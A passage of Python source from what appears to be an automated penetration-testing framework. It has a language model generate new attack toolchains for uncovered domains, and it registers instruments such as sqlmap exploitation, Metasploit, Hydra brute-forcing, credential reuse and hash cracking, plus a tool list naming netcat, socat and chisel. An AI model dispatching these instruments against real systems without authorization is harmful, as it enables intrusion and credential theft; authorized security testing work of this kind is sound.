    """Read ANTHROPIC_API_KEY from environment or /etc/skg/skg.env."""
    key = os.environ.get("ANTHROPIC_API_KEY", "")
    if key:
        return key
    try:
        env_file = _config_file("skg.env")
        if env_file.exists():
            for line in env_file.read_text().splitlines():
                line = line.strip()
                if line.startswith("ANTHROPIC_API_KEY="):
                    return line.split("=", 1)[1].strip().strip('"').strip("'")
    except Exception:
        pass
    return ""


def _create_toolchain_proposals_from_folds(active_folds_by_identity: dict, surface_path: str) -> list[str]:
    try:
        from skg.forge.generator import generate_toolchain
        from skg.forge.validator import validate
        from skg.forge import proposals as forge_proposals
    except Exception:
        return []

    created: list[str] = []
    candidates = []
    for identity_key, fold_manager in active_folds_by_identity.items():
        for fold in fold_manager.all():
            if fold.fold_type not in {"structural", "contextual"}:
                continue
            if fold.discovery_probability < 0.7:
                continue
            candidates.append((identity_key, fold))

    grouped: dict[tuple[str, str, str], list] = defaultdict(list)
    for identity_key, fold in candidates:
        domain = _infer_domain_from_fold(fold)
        family = _fold_service_family(fold)
        grouped[(identity_key, domain, family)].append(fold)

    existing = forge_proposals.proposals_for_dedupe(include_archived=True)

    for (identity_key, domain, family), folds in grouped.items():
        if not folds:
            continue
        def _fold_weight(fold) -> float:
            weight = getattr(fold, "gravity_weight", 0.0)
            if callable(weight):
                weight = weight()
            try:
                return float(weight)
            except Exception:
                return 0.0

        folds = sorted(
            folds,
            key=_fold_weight,
            reverse=True,
        )
        top_fold = folds[0]
        dedupe_key = f"{identity_key}:{domain}:{family}:{top_fold.fold_type}"

        if forge_proposals.is_in_cooldown(domain):
            continue

        if any(
            p.get("proposal_kind") == "toolchain_generation"
            and p.get("domain") == domain
            and dedupe_key in (p.get("evidence") or "")
            for p in existing
        ):
            continue

        compiler_packages = set()
        compiler_keywords = set()
        collection_hints = set()
        fold_ids = []
        evidence_lines = [dedupe_key]
        for fold in folds:
            fold_ids.append(getattr(fold, "id", ""))
            collection_hints.add(getattr(fold, "constraint_source", ""))
            hints = _compiler_hints_from_fold(fold)
            compiler_packages.update(hints.get("packages", []))
            compiler_keywords.update(hints.get("keywords", []))
            detail = (getattr(fold, "detail", "") or "").strip()
            if detail:
                evidence_lines.append(f"- {detail}")

        summary = f"{len(folds)} {domain} fold{'s' if len(folds) != 1 else ''} on {family}"
        description = (
            f"{summary} lack wicket/toolchain coverage"
            if len(folds) > 1
            else (getattr(top_fold, "detail", "")[:160] or f"{domain} structural gap")
        )
        gap = {
            "service": family if family != "generic" else domain,
            "attack_surface": getattr(top_fold, "detail", ""),
            "hosts": [identity_key],
            "category": f"{top_fold.fold_type}_fold_cluster",
            "evidence": "\n".join(evidence_lines[:12]),
            "forge_ready": True,
            "collection_hints": sorted(h for h in collection_hints if h),
            "compiler_hints": {
                "packages": sorted(compiler_packages),
                "keywords": sorted(compiler_keywords),
            },
            "fold_count": len(folds),
            "fold_ids": [fid for fid in fold_ids if fid],
        }

        # Inject Anthropic API key so the forge can use Claude when available
        api_key = _get_anthropic_api_key()
        if api_key:
            os.environ.setdefault("ANTHROPIC_API_KEY", api_key)

        try:
            gen_result = generate_toolchain(
                domain=domain,
                description=description,
                gap=gap,
                resonance_engine=_get_resonance_engine(),
            )
            if not gen_result.get("success"):
                continue
            staged_path = Path(gen_result["staging_path"])
            try:
                val_result = validate(staged_path)
            except Exception:
                val_result = {"passed": False, "checks": {}, "tc_name": domain}
            proposal = forge_proposals.create(
                domain=domain,
                description=description,
                gap=gap,
                generation_result=gen_result,
                validation_result=val_result,
            )
            created.append(proposal["id"])
        except Exception:
            continue

    return created


def _create_catalog_growth_proposals_from_folds(active_folds_by_identity: dict) -> list[str]:
    try:
        from skg.forge import proposals as forge_proposals
    except Exception:
        return []

    created: list[str] = []
    existing = forge_proposals.proposals_for_dedupe(include_archived=True)
    grouped: dict[tuple[str, str, str], list] = defaultdict(list)
    for identity_key, fold_manager in active_folds_by_identity.items():
        for fold in fold_manager.all():
            if fold.fold_type not in {"contextual", "projection"}:
                continue
            if float(getattr(fold, "discovery_probability", 0.0) or 0.0) < 0.7:
                continue
            domain = _infer_domain_from_fold(fold)
            family = _fold_service_family(fold)
            grouped[(identity_key, domain, family)].append(fold)

    for (identity_key, domain, family), folds in grouped.items():
        if forge_proposals.is_in_cooldown(domain):
            continue

        def _fold_weight(fold) -> float:
            weight = getattr(fold, "gravity_weight", 0.0)
            if callable(weight):
                weight = weight()
            try:
                return float(weight)
            except Exception:
                return 0.0

        folds = sorted(folds, key=_fold_weight, reverse=True)
        top_fold = folds[0]
        dedupe_key = f"{identity_key}:{domain}:catalog_growth:{family}:{top_fold.fold_type}"
        if any(
            p.get("proposal_kind") == "catalog_growth"
            and p.get("domain") == domain
            and p.get("status") not in {"expired", "rejected", "superseded"}
            and dedupe_key in (p.get("evidence") or "")
            for p in existing
        ):
            continue

        compiler_packages = set()
        compiler_keywords = set()
        fold_ids = []
        evidence_lines = [dedupe_key]
        for fold in folds:
            fold_id = getattr(fold, "id", "")
            if fold_id:
                fold_ids.append(fold_id)
            hints = _compiler_hints_from_fold(fold)
            compiler_packages.update(hints.get("packages", []))
            compiler_keywords.update(hints.get("keywords", []))
            detail = (getattr(fold, "detail", "") or "").strip()
            if detail:
                evidence_lines.append(f"- {detail}")

        hints = {
            "packages": sorted(compiler_packages),
            "keywords": sorted(compiler_keywords),
        }
        command, description = _catalog_growth_command_for_cluster(domain, family, folds, hints)
        top_detail = (getattr(top_fold, "detail", "") or "").strip()
        category = f"{top_fold.fold_type}_fold_cluster"
        if len({getattr(f, 'fold_type', '') for f in folds}) > 1:
            category = "mixed_fold_cluster"

        proposal = forge_proposals.create_catalog_growth(
            domain=domain,
            description=description,
            hosts=[identity_key],
            attack_surface=top_detail,
            evidence="\n".join(evidence_lines[:12]),
            category=category,
            compiler_hints=hints,
            fold_ids=fold_ids,
            command=command,
        )
        cluster_fold_ids = set(fold_ids)
        legacy_ids = []
        for existing_proposal in existing:
            if existing_proposal.get("proposal_kind") != "catalog_growth":
                continue
            if existing_proposal.get("status") != "pending":
                continue
            if existing_proposal.get("domain") != domain:
                continue
            if list(existing_proposal.get("hosts", []) or []) != [identity_key]:
                continue
            if existing_proposal.get("id") == proposal["id"]:
                continue
            existing_fold_ids = set(existing_proposal.get("fold_ids", []) or [])
            if existing_fold_ids and existing_fold_ids.issubset(cluster_fold_ids):
                legacy_ids.append(existing_proposal["id"])
        if legacy_ids:
            try:
                forge_proposals.supersede(
                    legacy_ids,
                    replacement_id=proposal["id"],
                    reason="clustered_catalog_growth",
                )
            except Exception:
                pass
        created.append(proposal["id"])
        existing.append(proposal)

    return created


def _create_instrument_proposals_from_dark_hypotheses(landscape: list) -> list[str]:
    """
    Convert dark hypotheses (high-torque wickets with no instrument coverage)
    into toolchain generation proposals.

    Dark hypotheses are structural blindspots: the wicket graph's Kuramoto
    dynamics predict attack surface in a domain, but the instrument set has
    no wavelength that can observe the relevant wickets.  The autonomous loop
    closes here: generate a toolchain whose catalog + adapter cover those
    wickets, so the next gravity cycle can dispatch real instruments toward them.
    """
    try:
        from skg.forge.generator import generate_toolchain
        from skg.forge.validator import validate
        from skg.forge import proposals as forge_proposals
    except Exception:
        return []

    created: list[str] = []

    # Aggregate dark hypotheses across all landscape targets
    domain_dark: dict[str, list[dict]] = {}
    domain_ips: dict[str, set] = {}
    for t in landscape:
        ip = t.get("ip", "unknown")
        for dh in t.get("wgraph_dark", []):
            d = dh.get("domain", "unknown")
            domain_dark.setdefault(d, []).append(dh)
            domain_ips.setdefault(d, set()).add(ip)

    existing = forge_proposals.proposals_for_dedupe(include_archived=True)

    for domain, dark_list in domain_dark.items():
        # Only act when total torque is significant enough to be worth building for
        total_torque = sum(dh.get("torque", 0.0) for dh in dark_list)
        if total_torque < 1.0:
            continue

        if forge_proposals.is_in_cooldown(domain):
            continue

        # Deduplicate: skip if an active toolchain_generation proposal already
        # covers this domain and was seeded from a dark hypothesis
        if any(
            p.get("proposal_kind") == "toolchain_generation"
            and p.get("domain") == domain
            and "dark_hypothesis" in (p.get("evidence") or "")
            and p.get("status") not in {"expired", "rejected", "superseded"}
            for p in existing
        ):
            continue

        hosts = sorted(domain_ips.get(domain, set()))
        top_wickets = sorted(dark_list, key=lambda x: -x.get("torque", 0.0))[:6]
        wicket_ids = [dh["wicket_id"] for dh in top_wickets]

        evidence_lines = [f"dark_hypothesis:{domain}:{','.join(wicket_ids[:3])}"]
        for dh in top_wickets[:5]:
            label = dh.get("label") or dh["wicket_id"]
            evidence_lines.append(f"- {dh['wicket_id']} τ={dh['torque']:.2f} [{label}]")

        description = (
            f"{len(dark_list)} dark hypothesis(es) in {domain} domain — "
            f"field predicts {', '.join(wicket_ids[:3])} but no instrument can observe them"
        )
        gap = {
            "service":         domain,
            "attack_surface":  description,
            "hosts":           hosts,
            "category":        "dark_hypothesis_cluster",
            "evidence":        "\n".join(evidence_lines[:12]),
            "forge_ready":     True,
            "collection_hints": [],
            "compiler_hints":  {
                "packages": [],
                "keywords": wicket_ids[:8],
            },
            "fold_count":    len(dark_list),
            "wicket_ids":    wicket_ids,
            "total_torque":  round(total_torque, 3),
        }

        api_key = _get_anthropic_api_key()
        if api_key:
            os.environ.setdefault("ANTHROPIC_API_KEY", api_key)

        try:
            gen_result = generate_toolchain(
                domain=domain,
                description=description,
                gap=gap,
                resonance_engine=_get_resonance_engine(),
            )
            if not gen_result.get("success"):
                continue
            staged_path = Path(gen_result["staging_path"])
            try:
                val_result = validate(staged_path)
            except Exception:
                val_result = {"passed": False, "checks": {}, "tc_name": domain}
            proposal = forge_proposals.create(
                domain=domain,
                description=description,
                gap=gap,
                generation_result=gen_result,
                validation_result=val_result,
            )
            created.append(proposal["id"])
            log.info(
                "[forge] dark_hypothesis→proposal: domain=%s wickets=%s id=%s",
                domain, wicket_ids[:3], proposal["id"][:8],
            )
        except Exception as exc:
            log.debug(f"[forge] dark hypothesis proposal failed for {domain}: {exc}")
            continue

    return created


def _wgraph_notify_install(installed_path: Path) -> None:
    """
    Post-install hook: register new toolchain's wickets as observable
    wavelengths in the wicket graph singleton.

    When a generated toolchain lands (via proposals.py accept), its catalog
    defines new wicket IDs for a previously dark domain.  Registering those
    IDs here means the next gravity cycle will classify those wickets as
    *observable* rather than dark, closing the autonomous loop:

        dark hypothesis → forge proposal → install → wavelength registration
        → observable hypothesis → instrument dispatch → realized wicket
    """
    global _wgraph
    if _wgraph is None:
        return
    try:
        new_wavelengths: dict[str, list[str]] = {}
        for catalog_file in installed_path.glob("contracts/catalogs/*.json"):
            try:
                cat = json.loads(catalog_file.read_text())
            except Exception:
                continue
            wickets = list((cat.get("wickets") or {}).keys())
            if wickets:
                inst_name = f"{installed_path.name}_projector"
                new_wavelengths.setdefault(inst_name, []).extend(wickets)
        if new_wavelengths:
            _wgraph.register_instruments(new_wavelengths)
            total = sum(len(v) for v in new_wavelengths.values())
            log.info(
                "[wicket_graph] post-install: registered %d new wavelengths from %s",
                total, installed_path.name,
            )
    except Exception as exc:
        log.debug(f"[wicket_graph] notify_install failed: {exc}")


# Register the hook now that _wgraph_notify_install is defined.
_register_wgraph_install_hook()


def discover_available_tools() -> dict[str, bool]:
    """Scan PATH for all security tools SKG can use.

    Returns a dict of {tool_name: available} reflecting what is actually installed
    on this machine at runtime.  This replaces per-instrument ad-hoc `which` calls
    with a single authoritative sweep at detect_instruments() time.

    New tools installed after startup are not picked up until the next cycle that
    calls detect_instruments() — which is acceptable given instrument lifecycles.
    """
    import shutil

    tool_names = [
        # Network recon
        "nmap", "tshark", "tcpdump", "masscan", "zmap",
        # Web enumeration
        "nikto", "gobuster", "ffuf", "wfuzz", "feroxbuster",
        "sqlmap", "wpscan", "nuclei", "curl", "wget",
        # Exploitation
        "msfconsole", "msfvenom", "searchsploit",
        # Binary / reversing
        "checksec", "rabin2", "r2", "radare2", "ROPgadget", "ropgadget",
        "ltrace", "strace", "objdump", "readelf", "strings",
        "binwalk", "ghidra", "gdb", "pwndbg", "capa",
        # Auth / credential
        "hydra", "john", "hashcat", "medusa", "ncrack",
        "enum4linux", "enum4linux-ng", "rpcclient", "smbclient", "smbmap",
        # AD / Kerberos
        "bloodhound-python", "impacket-getTGT", "impacket-secretsdump",
        "impacket-psexec", "kerbrute", "evil-winrm",
        "crackmapexec", "nxc",
        # Discovery / OSINT
        "amass", "subfinder", "assetfinder", "naabu", "dnsx",
        # Container / cloud
        "docker", "kubectl", "trivy",
        # Crypto / hash / PKI
        "openssl", "gpg", "certipy",
        # Packet / pcap / MitM
        "wireshark", "responder", "bettercap",
        # Tunneling / shells
        "nc", "ncat", "netcat", "socat", "chisel",
        # Language runtimes (used for scripting/payloads)
        "python3", "ruby", "perl", "php", "go", "node",
    ]

    available: dict[str, bool] = {}
    for tool in tool_names:
        available[tool] = shutil.which(tool) is not None

    # Python module checks — confirm runtime capabilities of sensors and adapters
    import importlib.util
    for pkg in [
        "pwntools", "impacket", "paramiko", "sqlalchemy", "scapy",
        "requests", "ldap3", "cryptography", "yaml",
        "angr", "frida",
    ]:
        available[f"py:{pkg}"] = importlib.util.find_spec(pkg) is not None

    log.debug("[tool_discovery] found: %s",
              ", ".join(t for t, ok in available.items() if ok))
    return available


# Tool availability cache — populated once at detect_instruments() time.
_AVAILABLE_TOOLS: dict[str, bool] = {}

# Gravity adapter plugin registry — maps instrument_name → run() function.
# Adapters live in skg-gravity/adapters/ and are loaded once at startup.
# New instruments go here instead of into the elif dispatch chain.
_GRAVITY_ADAPTERS: dict[str, Any] = {}


def _load_gravity_adapters() -> None:
    """
    Scan skg-gravity/adapters/ for instrument plugin modules and register them.

    Each adapter module must define:
      INSTRUMENT_NAME: str  — the instrument key (matches detect_instruments())
      run(ip, target, run_id, out_dir, result, *, authorized, node_key, **kwargs) -> dict

    This decouples tool execution from the gravity physics engine.  New tools
    are added as adapter modules, not as elif branches in the dispatch block.
    The legacy _exec_* functions remain as fallbacks for instruments not yet
    migrated to the adapter pattern.
    """
    global _GRAVITY_ADAPTERS
    adapters_dir = Path(__file__).parent / "adapters"
    if not adapters_dir.exists():
        return
    for adapter_file in sorted(adapters_dir.glob("*.py")):
        if adapter_file.stem.startswith("_"):
            continue
        try:
            mod = _load_module_from_file(
                f"skg_gravity_adapter_{adapter_file.stem}", adapter_file
            )
            name = getattr(mod, "INSTRUMENT_NAME", None)
            fn   = getattr(mod, "run", None)
            if name and callable(fn):
                _GRAVITY_ADAPTERS[name] = fn
                log.debug("[adapters] loaded: %s from %s", name, adapter_file.name)
        except Exception as exc:
            log.debug("[adapters] failed to load %s: %s", adapter_file.name, exc)


_load_gravity_adapters()


def detect_instruments() -> dict:
    """Detect which instruments are available on the system."""
    global _AVAILABLE_TOOLS
    _AVAILABLE_TOOLS = discover_available_tools()
    instruments = {}

    # HTTP collector — unauthenticated web scanning
    instruments["http_collector"] = Instrument(
        name="http_collector",
        description="Unauthenticated HTTP recon — headers, paths, forms, basic injection",
        wavelength=["WB-01", "WB-02", "WB-03", "WB-04", "WB-05", "WB-06",
                     "WB-09", "WB-11", "WB-12", "WB-17", "WB-18", "WB-19",
                     "WB-22", "WB-24"],
        cost=1.0,
        available=_canonical_web_runtime_available(),
    )

    # Authenticated scanner — post-auth surface with CSRF handling
    instruments["auth_scanner"] = Instrument(
        name="auth_scanner",
        description="Authenticated scanning — CSRF-aware login, post-auth injection testing",
        wavelength=["WB-06", "WB-07", "WB-08", "WB-09", "WB-10", "WB-11",
                     "WB-12", "WB-13", "WB-14", "WB-15", "WB-22"],
        cost=3.0,
        available=_canonical_web_runtime_available(),
    )

    # ── gobuster: web directory enumeration ────────────────────────────────
    # Available when binary present, or when the adapter exists with Python fallback
    # (requests is stdlib-compatible via urllib when requests pkg not present)
    _gobuster_adapter = (SKG_HOME / "skg-web-toolchain" / "adapters" / "web_active" / "gobuster_adapter.py").exists()
    instruments["gobuster"] = Instrument(
        name="gobuster",
        description="Web directory/file enumeration — discovers hidden paths, admin panels, backup files",
        wavelength=[
            "WB-03", "WB-04", "WB-05", "WB-08", "WB-09",
            "WB-14", "WB-15", "WB-17", "WB-20",
        ],
        cost=1.5,
        available=_gobuster_adapter,  # adapter has Python fallback when binary absent
    )

    # ── sqlmap: SQL injection exploitation ─────────────────────────────────
    instruments["sqlmap"] = Instrument(
        name="sqlmap",
        description="Automated SQL injection testing and exploitation",
        wavelength=[
            "WB-05", "WB-10", "DP-10", "DP-02",
        ],
        cost=2.0,
        available=_tool_available("sqlmap"),
    )

    # ── enum4linux: SMB/AD enumeration ─────────────────────────────────────
    instruments["enum4linux"] = Instrument(
        name="enum4linux",
        description="SMB and Active Directory enumeration — users, groups, shares, password policy",
        wavelength=[
            "HO-05", "HO-06", "HO-20",
            "AD-01", "AD-02", "AD-03",
        ],
        cost=1.5,
        available=(_tool_available("enum4linux-ng") or _tool_available("enum4linux") or _tool_available("rpcclient")),
    )

    # ── nikto: web vulnerability scanner ───────────────────────────────────
    instruments["nikto"] = Instrument(
        name="nikto",
        description="Web vulnerability scanner — comprehensive HTTP/HTTPS probing",
        wavelength=[
            "WB-02", "WB-03", "WB-04", "WB-05", "WB-06",
            "WB-07", "WB-08", "WB-09", "WB-10", "WB-15",
            "WB-17", "WB-18",
        ],
        cost=2.5,
        available=_tool_available("nikto"),
    )

    # ── searchsploit: exploit-db lookup for detected versions ──────────────
    instruments["searchsploit"] = Instrument(
        name="searchsploit",
        description="Exploit-DB search for detected service versions — confirms exploitability",
        wavelength=[
            "HO-25", "WB-21", "DP-06",
        ],
        cost=0.5,
        available=_tool_available("searchsploit"),
    )

    # NVD feed — CVE intelligence for discovered services
    instruments["nvd_feed"] = Instrument(
        name="nvd_feed",
        description="NVD CVE lookup — maps service versions to known vulnerabilities",
        wavelength=["CVE-*", "WB-20"],  # CVE wickets + db privilege indicators
        cost=2.0,
        available=(FEEDS_PATH / "nvd_ingester.py").exists() and bool(_load_nvd_key()),
    )

    # Metasploit — exploitation framework
    msf_available = _AVAILABLE_TOOLS.get("msfconsole", False)
    instruments["metasploit"] = Instrument(
        name="metasploit",
        description="Metasploit auxiliary/exploit modules — can bypass app-layer defenses",
        wavelength=["WB-09", "WB-10", "WB-14", "WB-20", "WB-21",
                     "CE-*", "HO-*", "AD-*"],
        cost=5.0,
        available=msf_available,
    )

    # Tshark/pcap — network-layer observation
    tshark_available = _AVAILABLE_TOOLS.get("tshark", False) or _AVAILABLE_TOOLS.get("tcpdump", False)
    instruments["pcap"] = Instrument(
        name="pcap",
        description="Packet capture — observes interactions from the wire, bypasses app-layer opacity",
        wavelength=["WB-09", "WB-15", "WB-16", "WB-18",
                     "HO-*", "AD-*"],
        cost=2.0,
        available=tshark_available,
    )

    # SSH sensor — direct host access
    instruments["ssh_sensor"] = Instrument(
        name="ssh_sensor",
        description="SSH remote enumeration — kernel, SUID, sudo, creds, services",
        wavelength=["HO-*", "CE-*"],
        cost=2.0,
        available=(SKG_HOME / "skg" / "sensors" / "ssh_sensor.py").exists(),
    )

    # Nmap — network scanner
    nmap_available = _AVAILABLE_TOOLS.get("nmap", False)
    instruments["nmap"] = Instrument(
        name="nmap",
        description="Network scanner — service detection, version fingerprinting, NSE scripts",
        wavelength=["WB-01", "WB-02", "WB-17", "HO-*", "AD-01", "AD-16", "CE-04", "CE-01", "DP-01"],
        cost=3.0,
        available=nmap_available,
    )

    # BloodHound — AD domain enumeration via BloodHound CE REST API or Neo4j.
    # Canonical delegation ownership note:
    #   - AD-06/AD-08 posture are canonical domain slices.
    #   - AD-07 is routed as service context sidecar (not canonical AD-domain wicket output).
    #   - AD-09 remains deferred/non-canonical.
    # Availability: requires BH CE running on localhost:8080 or Neo4j on 7687
    bh_url = os.environ.get("BH_URL", "http://localhost:8080")
    bh_user = os.environ.get("BH_USERNAME", "admin")
    bh_pass = os.environ.get("BH_PASSWORD", "")
    neo4j_pass = os.environ.get("NEO4J_PASSWORD", "")
    bh_available = bool(bh_pass or neo4j_pass)
    if bh_available:
        # Quick reachability check — don't block startup if BH is down
        try:
            import urllib.request
            urllib.request.urlopen(bh_url, timeout=2)
        except Exception:
            bh_available = False
    instruments["bloodhound"] = Instrument(
        name="bloodhound",
        description=(
            "BloodHound CE — AD object graph for canonical AD slices; "
            "delegation canonical coverage is AD-06/AD-08 posture only; "
            "legacy delegation paths are compatibility-only"
        ),
        wavelength=["AD-01", "AD-02", "AD-03", "AD-04", "AD-05",
                     "AD-06", "AD-08", "AD-10",
                     "AD-11", "AD-12", "AD-13", "AD-14", "AD-15",
                     "AD-16", "AD-17", "AD-18", "AD-19", "AD-20",
                     "AD-21", "AD-22", "AD-23", "AD-24", "AD-25"],
        cost=4.0,
        available=bh_available,
    )

    # Data pipeline profiler — connects to databases and emits DP-* wicket events
    # Wavelength: all DP-01..DP-15 wickets
    # Availability: requires SQLAlchemy and at least one configured data source
    data_profiler_path = SKG_HOME / "skg-data-toolchain" / "adapters" / "db_profiler" / "profile.py"
    # data_profiler only available if data_sources.yaml has actual entries
    _ds_file = _config_file("data_sources.yaml")
    try:
        import yaml as _yaml
        _ds_cfg = _yaml.safe_load(_ds_file.read_text()) if _ds_file.exists() else {}
        data_sources_configured = bool((_ds_cfg or {}).get("data_sources"))
    except Exception:
        data_sources_configured = False
    sqlalchemy_available = _AVAILABLE_TOOLS.get("py:sqlalchemy", False)
    instruments["data_profiler"] = Instrument(
        name="data_profiler",
        description="DB profiler — schema, completeness, freshness, drift, integrity for data pipelines",
        wavelength=["DP-01", "DP-02", "DP-03", "DP-04", "DP-05",
                     "DP-06", "DP-07", "DP-08", "DP-09", "DP-10",
                     "DP-11", "DP-12", "DP-13", "DP-14", "DP-15"],
        cost=2.0,
        # Available when the profiler script exists. Data sources are derived
        # from the surface services list at execution time — mysql/postgres
        # on the target surface IS the data source. No pre-configuration needed.
        available=data_profiler_path.exists(),
    )

    # DB discovery — SSH-based DB enumeration, default/harvested cred test, exposure
    # Directed toward DE-* wickets; works without pre-configured data_sources.yaml
    # Available whenever the adapter script exists and paramiko is installed
    db_discovery_path = SKG_HOME / "skg-data-toolchain" / "adapters" / "db_discovery" / "parse.py"
    _paramiko_ok = _AVAILABLE_TOOLS.get("py:paramiko", False)
    instruments["db_discovery"] = Instrument(
        name="db_discovery",
        description="SSH DB discovery — enumerate MySQL/PG/Mongo/Redis, test default and harvested creds, check bind/auth config",
        wavelength=["DE-01", "DE-02", "DE-03", "DE-04", "DE-05",
                    "DE-06", "DE-07", "DE-08", "DE-09", "DE-10", "DE-11"],
        cost=2.0,
        available=db_discovery_path.exists() and _paramiko_ok,
    )

    # Binary analysis — checksec, rabin2, radare2, ROPgadget, ltrace, strace
    # Available when at least one analysis tool is present (from dynamic discovery)
    binary_available = any(
        _AVAILABLE_TOOLS.get(t, False)
        for t in ["checksec", "rabin2", "r2", "radare2", "ROPgadget", "ropgadget",
                  "ltrace", "strace", "gdb", "objdump"]
    )

    # System auditor — filesystem, process, and log integrity via SSH
    sysaudit_path = SKG_HOME / "skg-host-toolchain" / "adapters" / "sysaudit" / "audit.py"
    instruments["sysaudit"] = Instrument(
        name="sysaudit",
        description="System integrity audit — filesystem hashes, process manifest, log integrity",
        wavelength=[
            "FI-01", "FI-02", "FI-03", "FI-04", "FI-05",
            "FI-06", "FI-07", "FI-08",
            "PI-01", "PI-02", "PI-03", "PI-04", "PI-05",
            "PI-06", "PI-07", "PI-08",
            "LI-01", "LI-02", "LI-03", "LI-04", "LI-05",
            "LI-06", "LI-07", "LI-08",
        ],
        cost=3.0,
        available=sysaudit_path.exists(),
    )

    # Container inspect — runs docker inspect from host, emits CE-* wickets
    # No SSH needed -- works from archbox against any container in scope
    ce_parse_path = SKG_HOME / "skg-container-escape-toolchain" / "adapters" / "container_inspect" / "parse.py"
    docker_available = _AVAILABLE_TOOLS.get("docker", False)
    instruments["container_inspect"] = Instrument(
        name="container_inspect",
        description="Docker inspect — CE-01 root, CE-02 privileged, CE-03 socket, CE-04 API",
        wavelength=["CE-01","CE-02","CE-03","CE-04","CE-05","CE-06","CE-07"],
        cost=1.5,
        available=ce_parse_path.exists() and docker_available,
    )

    # Binary analysis — checksec, rabin2, ltrace, ROPgadget
    # Wavelength: BA-01..BA-06  Cost: 4.0 (static + dynamic)
    instruments["binary_analysis"] = Instrument(
        name="binary_analysis",
        description="Binary exploitation analysis — NX/ASLR/canary, dangerous functions, ROP gadgets",
        wavelength=["BA-01", "BA-02", "BA-03", "BA-04", "BA-05", "BA-06"],
        cost=4.0,
        available=binary_available,
    )

    # capa capability analysis — SFTP binary + local capa run
    # Wavelength: BA-07 (capability_identified), BA-08 (attck_technique_confirmed)
    # Cost: 6.0 — SFTP transfer + capa scan (slower than checksec, faster than Ghidra)
    _capa_adapter = SKG_HOME / "skg-binary-toolchain" / "adapters" / "capa_analysis" / "parse.py"
    instruments["capa_analysis"] = Instrument(
        name="capa_analysis",
        description="capa capability + ATT&CK technique mapping — BA-07/BA-08",
        wavelength=["BA-07", "BA-08"],
        cost=6.0,
        available=_capa_adapter.exists() and _AVAILABLE_TOOLS.get("capa", False) and _paramiko_ok,
    )

    # angr symbolic execution — SFTP binary + local angr exploration
    # Wavelength: BA-09 (symbolic_vuln_path_confirmed)
    # Cost: 10.0 — angr CFGFast + bounded symbolic exploration; expensive but non-executing
    _angr_adapter = SKG_HOME / "skg-binary-toolchain" / "adapters" / "angr_symbolic" / "parse.py"
    instruments["angr_symbolic"] = Instrument(
        name="angr_symbolic",
        description="angr symbolic execution — confirms feasible path to dangerous call (BA-09)",
        wavelength=["BA-09"],
        cost=10.0,
        available=_angr_adapter.exists() and _AVAILABLE_TOOLS.get("py:angr", False) and _paramiko_ok,
    )

    # Frida dynamic instrumentation — hooks dangerous calls at runtime (authorized only)
    # Wavelength: BA-10 (runtime_hook_confirmed)
    # Cost: 8.0 — requires frida-server on target OR local frida + SFTP fetch
    _frida_adapter = SKG_HOME / "skg-binary-toolchain" / "adapters" / "frida_trace" / "parse.py"
    instruments["frida_trace"] = Instrument(
        name="frida_trace",
        description="Frida runtime hook — intercepts dangerous calls during live execution (BA-10)",
        wavelength=["BA-10"],
        cost=8.0,
        available=_frida_adapter.exists() and _AVAILABLE_TOOLS.get("py:frida", False) and _paramiko_ok,
    )

    # IoT firmware probe — network-side + offline image analysis
    # Wavelength: IF-01..IF-15
    iot_probe_path = SKG_HOME / "skg-iot_firmware-toolchain" / "adapters" / "firmware_probe" / "probe.py"
    instruments["iot_firmware"] = Instrument(
        name="iot_firmware",
        description="IoT firmware probe — banner grab + CVE version check for embedded components",
        wavelength=[f"IF-{i:02d}" for i in range(1, 16)],
        cost=2.0,
        available=iot_probe_path.exists(),
    )

    # Supply chain SBOM checker — SSH package collection + CVE cross-reference
    # Wavelength: SC-01..SC-12
    sc_probe_path = SKG_HOME / "skg-supply-chain-toolchain" / "adapters" / "sbom_check" / "check.py"
    instruments["supply_chain"] = Instrument(
        name="supply_chain",
        description="Supply chain SBOM check — installed packages vs CVE catalog",
        wavelength=[f"SC-{i:02d}" for i in range(1, 13)],
        cost=2.0,
        available=sc_probe_path.exists(),
    )

    # AI/ML service probe — Ollama, OpenAI-compat, Qdrant, Chroma, Jupyter, MLflow
    AI_PROBE_PATH = SKG_HOME / "skg-ai-toolchain" / "adapters" / "ai_probe" / "probe.py"
    instruments["ai_probe"] = Instrument(
        name="ai_probe",
        description="AI/ML target probe — Ollama, OpenAI-compat, Qdrant, Chroma, Jupyter, MLflow, Triton",
        wavelength=["AI-01", "AI-02", "AI-03", "AI-04", "AI-05", "AI-06",
                    "AI-07", "AI-08", "AI-09", "AI-10", "AI-11", "AI-12",
                    "AI-13", "AI-14", "AI-15", "AI-16", "AI-17", "AI-18",
                    "AI-19", "AI-20"],
        cost=3.0,
        available=AI_PROBE_PATH.exists(),
    )

    # Credential reuse — cross-surface credential testing
    # Wavelength: SSH initial access wickets + web auth wickets
    # The energy contribution is coupling energy: untested cred × service pairs.
    # Available whenever the cred_reuse module is present (no external deps needed
    # for proposal generation; paramiko required for live SSH testing).
    cred_reuse_path = Path(__file__).parent / "cred_reuse.py"
    instruments["cred_reuse"] = Instrument(
        name="cred_reuse",
        description="Credential reuse — cross-surface testing of found credentials (SSH + HTTP)",
        wavelength=["HO-02", "HO-03", "WB-08", "WB-20"],
        cost=1.5,
        available=cred_reuse_path.exists(),
    )

    # Hydra — active brute-force of SSH/FTP/SMB/HTTP auth services
    # Complements cred_reuse (which tests known creds) — hydra tests wordlists
    # and default credential pairs against discovered auth services.
    instruments["hydra"] = Instrument(
        name="hydra",
        description="Hydra brute-force — SSH/FTP/SMB/HTTP login with default and harvested credential lists",
        wavelength=["HO-02", "HO-03", "WB-08", "WB-19", "DE-04"],
        cost=4.0,
        available=_AVAILABLE_TOOLS.get("hydra", False),
    )

    # John the Ripper — offline hash cracking after hash harvest from enum4linux/ssh/web
    instruments["john"] = Instrument(
        name="john",
        description="John the Ripper — offline hash cracking for harvested NTLM/shadow/web hashes",
        wavelength=["HO-03", "AD-03", "WB-08"],
        cost=5.0,
        available=_AVAILABLE_TOOLS.get("john", False) or _AVAILABLE_TOOLS.get("hashcat", False),
    )

    # Structured data fetcher — pulls JSON/JSONL/XML/YAML from web endpoints.
    # Domain agnostic: probes wellknown structured endpoints on any HTTP target.
    # Wavelength covers structured-data exposure wickets WB-30..WB-40.
    # Available whenever skg.sensors.struct_fetch can be imported (stdlib only).
    try:
        from skg.sensors import struct_fetch as _sf_check  # noqa: F401
        _struct_fetch_ok = True
    except ImportError:
        _struct_fetch_ok = False
    instruments["web_struct_fetch"] = Instrument(
        name="web_struct_fetch",
        description=(
            "Structured endpoint fetch — JSON/JSONL/XML/YAML from OpenAPI, "
            "config, metrics, debug, health, sitemap endpoints"
        ),
        wavelength=[
